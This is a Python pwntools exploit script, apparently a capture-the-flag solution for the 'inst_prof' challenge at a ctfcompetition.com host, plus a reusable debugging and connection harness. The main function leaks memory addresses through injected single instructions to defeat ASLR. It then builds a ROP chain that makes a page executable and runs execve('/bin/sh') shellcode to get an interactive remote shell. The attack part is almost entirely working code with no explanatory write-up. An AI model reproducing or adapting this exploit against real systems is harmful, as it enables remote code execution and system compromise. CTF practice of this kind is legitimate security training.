#!/usr/bin/python2
import os
os.environ['TERM'] = 'xterm-256color'
import sys
from pwn import *
from time import sleep


# Setup gdb parameters
breakaddr = [
    #0x555555554b16,
    #0x555555554b1a,

]
breakname = [
#    "malloc"
]
# Addresses to print
addresses = [
#    0x6020C0
]

execute = []
execute.extend(['b *' + hex(br) for br in breakaddr])
#execute.extend(['b ' + br for br in breakname])
execute.append('set follow-fork-mode child')
execute.append('set follow-exec-mode same')
#execute.extend(['display/gx ' + hex(ad) for ad in addresses])


#execute.append('define fixheap')
#execute.append('\tset *(char*)0x603021 = 0x30')
#execute.append('end')
execute.append('vmmap')
execute.append('continue')
#execute.append('set $list=$rax')

#execute.append('del break 1')


#execute = flat(map(lambda x: x + '\n', execute))


##### Exploit Main #####
def main():
    global m
    # actual main
    # targets: local, remote, ssh - debugger: gdb, None - memviz: villoc, None
    # io_binary: True (input received on stdio), False (input received over tcp sock)
    # libc: local, remote, dbg - prelaods: list of additional prelaoded libraries
    # villoc does not work with gdb/fullrelro atm
    #m = Magic("lio", debugger="gdb", libc="local")
    #m = Magic("local", True, debugger="gdb", libc="local", aslr=False)
    #m = Magic("local", True, debugger=None, libc="local", aslr=False)
    m = Magic("remote", True)
    #m = Magic("vm", True, vm="ubi17", debugger="gdb", libc="local", aslr=True)
    #m.load_elf()
    #m.load_lib()
    #print("Shell: "+shell_code)
    nop = asm("nop")
    ret = asm("ret")
    add_r8_rdi = asm("sub r9, rdi")
    add_r12_rdi = asm("sub r12, rdi")
    add_r12_rcx = asm("sub r12, rcx")
    add_r12_rsp = asm("sub r12, rsp")
    add_r12_r14 = asm("sub r12, r14")
    pop_r14 = asm("pop r14")
    push_r14 = asm("push r14")
    dec_r14 = asm("dec r14")
    pop_r15 = asm("pop r15")
    push_r15 = asm("push r15")
    push_rsp = asm("push rsp")
    pop_rbx = asm("pop rbx")
    pop_rdi = asm("pop rdi")
    brk = asm("int3")
    xor_edi_edi = asm("xor edi, edi")

    #print(hexdump(payload))
    print m.c.recv()
    print m.c.recv()
    m.c.send(add_r8_rdi + ret)
    reftime = u64(m.c.recv())
    print ("Ref tick cnt: "+hex(reftime))

    m.c.send(add_r12_rdi+ret)
    leak_mmap = (u64(m.c.recv(), sign="signed")) -reftime
    mmap_base = leak_mmap & 0xfffffffffffff000
    print ("Leaked MMAP address: "+hex(leak_mmap))
    print ("Leaked MMAP base: "+hex(mmap_base))

    # Not working
    # m.c.send(add_r12_rcx+ret)
    # leak_libc = (u64(m.c.recv(), sign="signed")) -reftime
    # libc_base = leak_libc & 0xfffffffffffff000
    # print ("Leaked libc address: "+hex(leak_libc))
    # print ("Leaked libc base: "+hex(libc_base))

    m.c.send(add_r12_rsp+ret)
    leak_stack = (u64(m.c.recv(), sign="signed")) -reftime
    stack_base = (leak_stack & 0xfffffffffffff000) - 0x20000
    print ("Leaked stack address: "+hex(leak_stack))
    print ("Leaked stack base: "+hex(stack_base))

    print ("Get ret address to r14")
    m.c.send(pop_r14 + push_r14)
    m.c.recv()

    m.c.send(add_r12_r14+ret)
    leak_prog = (u64(m.c.recv(), sign="signed")) -reftime
    prog_base = (leak_prog & 0xfffffffffffff000)
    print ("Leaked prog address: "+hex(leak_prog))
    print ("Leaked prog base: "+hex(prog_base))

    print ("Get original ret address to r15")
    m.c.send(pop_r15+push_r15)
    m.c.recv()

    print ("Set address in r14")
    #for i in range(0xc0):
    for i in range(0x98):
        m.c.send(dec_r14+ret)
        junk = m.c.recv()
    print("Jumping to read")
    m.c.send(push_rsp+pop_rdi+push_r14)

    #m.c.send(push_rsp +push_r15 + brk)
    #m.c.recv()
    #m.c.send(pop_rbx+pop_rdi+push_r14)
    #m.c.send(pop_rbx+pop_rdi+brk)
    #m.c.recv()


    bss_base = prog_base + 0x202000
    bss_start = prog_base + 0x202070
    pop_rdi = prog_base + 0xbc3
    pop_rsi_r15 = prog_base + 0xbc1

    #pop_rbx_r12_rbp = prog_base +0xaab

    read_n = prog_base+0xa80
    page_exec = prog_base+0xa20
    ropchain = p64(pop_rsi_r15)+ p64(0x500) + "B"*8
    ropchain += p64(pop_rdi) + p64(bss_start)+p64(read_n)
    ropchain += p64(pop_rdi) + p64(bss_base)+p64(page_exec)
    ropchain += p64(bss_start) + "/bin/sh\0"

    print("sending stage 1")
    m.c.send(ropchain)

    #last_stage = brk + asm("mov rdi, rsp; mov rsi, 0; mov rdx, 0;mov rax, 59;syscall")
    last_stage = asm("mov rdi, rsp; mov rsi, 0; mov rdx, 0;mov rax, 59;syscall")
    print(len(last_stage))
    print(hexdump(last_stage))
    m.c.send("C"*(0x1000-88) +last_stage + "D" *((0x500+88 )-len(last_stage)))
    #m.c.send(cyclic(0x2000, n=8))

    m.c.interactive()

##### Program API #####

#### API Helper functions

# def sendlineafter(x,y):
#     return m.c.sendlineafter(x,y)
#
# def sendafter(x,y):
#     return m.c.sendafter(x,y)
#
# def cmd(menuIdx):
#     return sendlineafter('Your choice : ', '%d' % menuIdx)

def getResult():
    return m.c.recvuntil('+++++++++++++++++++++++++++++++++++++\n@', drop=True)

def choose_menu(x):
    m.c.sendlineafter('Command: ', str(x))

def choose_element(n):
    m.c.sendlineafter('Index: ', str(n))

def allocate(size):
    choose_menu(1)
    m.c.sendlineafter("Size: ", str(size))

def fill(n, data):
    choose_menu(2)
    choose_element(n)
    m.c.sendlineafter("Size: ", str(len(data)))
    m.c.sendafter("Content: ", data)

def free(n):
    choose_menu(3)
    choose_element(n)

def dump(n):
    choose_menu(4)
    choose_element(n)
    return m.c.recvuntil("1. Allocate")

def ret():
    choose_menu(5)

# SETTINGS that only needs to be set once per challenge
# Set binary path, set to None if unavailable
FN = './inst_prof'
# Set remote address
IP = 'inst-prof.ctfcompetition.com'
PORT = '1337'
# Set libcs
# Local libc
LLIB = '/home/gym/dev/ctf/libcs/libc_arch.so'
# libc with debug symbols
DLIB = '/home/gym/.lib/libc.so'
# Remote libc if given
RLIB = './libc.so.6'
# Ubuntu 16.04 vm libc
U16LIB = '/home/gym/dev/ctf/libcs/libc_u16.so'
# Ubuntu 17.04 vm libc
U17LIB = '/home/gym/dev/ctf/libcs/libc_u17.so'


# Set global timeout
TIMEOUT = 0.3

# Set architecture: arm i386 amd64 thumb aarch64 mips mips64 sparc sparc64 powerpc powerpc64 ia64
ARCH = 'amd64'
# Set OS: linux freebsd
OS = 'linux'
# Set endianness: big little
ENDIAN = 'little'
# Set word size if needed
WORDS = 0

# User for the remote terminal
SSH_USER = 'gym'

# Set terminal (leave empty to open dbg in new def term window)
TERMINAL = ['tmux', 'splitw','-h']

#TODO other debuggers (qira, strace, ltrace...)

class Magic(object):

    def __init__(self, target, is_io, **kwargs):
        global LIB, execute
        self.e = None
        self.c = None
        self.target = target
        self.is_io = is_io
        self.aslr = kwargs.get("aslr", False)
        self.env = os.environ.copy()
        self.binary = os.path.abspath(FN)
        self.dbg = kwargs.get("debugger", None)
        self.libc = kwargs.get("libc", "local")
        self.memviz = kwargs.get("memviz", None)
        self.debugger = kwargs.get("debugger", None)
        self.vm = kwargs.get("vm", "ubi17")
        self.preloads = kwargs.get("preloads",  [])
        self.is_attach = kwargs.get("is_attach", True)

        if self.libc == "local":
            self.lib_path = os.path.abspath(LLIB)
        elif self.libc == "remote":
            self.lib_path = os.path.abspath(RLIB)
        elif self.libc == "dbg":
            self.lib_path = os.path.abspath(DLIB)
        elif self.libc == "ubi16":
            self.lib_path = os.path.abspath(U16LIB)
        elif self.libc == "ubi17":
            self.lib_path = os.path.abspath(U17LIB)
        else:
            raise ValueError("Invalid libc type")

        self.memviz = kwargs.get("memviz", None)
        if WORDS != 0:
            context(arch = ARCH, os = OS, endian = ENDIAN, terminal=TERMINAL, aslr=self.aslr, word_size = WORDS)
        else:
            context(arch = ARCH, os = OS, endian = ENDIAN, terminal=TERMINAL, aslr=self.aslr)

        if target == "remote":
            self.c = remote(IP, PORT)
            self.libc = "remote"
            self.lib_path = os.path.abspath(RLIB)
        elif target == "local":
            if not self.is_io:
                self.c = remote("127.0.0.1", PORT)
                if self.debugger == "gdb":
                    procname = os.path.basename(os.path.normpath(self.binary))
                    # TODO make it non global
                    execute = flat(map(lambda x: x + '\n', execute))
                    # use this to attach to forked process
                    gdb.attach(self.c, execute=execute)
                    # use this to attach to the fork server (pretty much the same if follow child set)
                    #gdb.attach(procname, execute=execute)
            else:
                self.set_preload()

                if self.memviz is None and self.debugger is None:
                    self.c = process(self.binary, cwd=os.getcwd(), env=self.env)

                # TODO fix this bullshit code
                # Villoc + gdb should play nice together with preload/gdbscript
                elif self.memviz == "villoc":
                    path = ['ltrace', '-o', 'trace.tmp', self.binary]
                    self.c = process(path, cwd=os.getcwd(), env=self.env)
                elif self.debugger == "gdb":
                    self.c = process(self.binary, cwd=os.getcwd(), env=self.env)
                    # TODO make it non global
                    execute = flat(map(lambda x: x + '\n', execute))
                    gdb.attach(self.c, gdbscript=execute)
                else:
                    raise ValueError("Unknown debugger, memviz or something!")
        elif target == "vm":
            if self.is_io:
                self.open_ssh()
                self.set_preload()
                if self.debugger == "gdb" and self.is_attach:
                    self.c = self.s.process(self.binary, cwd=os.getcwd(), env=self.env)
                    execute = flat(map(lambda x: x + '\n', execute))
                    gdb.attach(self.c, execute=execute)
                elif self.debugger == "gdb" and not self.is_attach:
                    # TODO test this
                    if 'LD_PRELOAD' in self.env:
                        execute.insert("set environment LD_PRELOAD = "+self.env['LD_PRELOAD'], 0)
                    execute = flat(map(lambda x: x + '\n', execute))
                    self.c = gdb.debug(self.binary, ssh=self.s, execute=execute)
                else:
                    self.c = s.process(self.binary, cwd=os.getcwd(), env=self.env)
            else:
                self.c = remote(self.vm, PORT)
                if self.debugger == "gdb":
                    self.open_ssh()
                    execute = flat(map(lambda x: x + '\n', execute))
                    procname = os.path.basename(os.path.normpath(self.binary))
                    gdb.attach(procname, execute=execute, ssh=self.s)


    def __del__(self):
        if self.memviz == "villoc" and self.target == "lio":
            os.system('villoc.py trace.tmp trace.html')

    def load_elf(self):
        self.e = ELF(self.binary)

    def load_lib(self):
        self.l = ELF(self.lib_path)

    def open_ssh(self, cwd=os.getcwd()):
        self.s=ssh(SSH_USER, self.vm)
        self.s.set_working_directory(os.getcwd())
        tmp_env = self.s.system('printenv').recv()
        self.env={}
        for line in tmp_env.splitlines():
            var = line.split('=')[0]
            val = line.split('=')[1]
            if var != '_':
                self.env[var]=val

    def set_preload(self):
        # preload libs
        if self.libc != "local":
            self.env['LD_PRELOAD'] = self.lib_path
        for prelib in self.preloads:
            self.env['LD_PRELOAD'] += ":" + os.path.abspath(prelib)



# Global Magic instance
m = None


if __name__ == "__main__":
    #c, e, l = init()
    main()
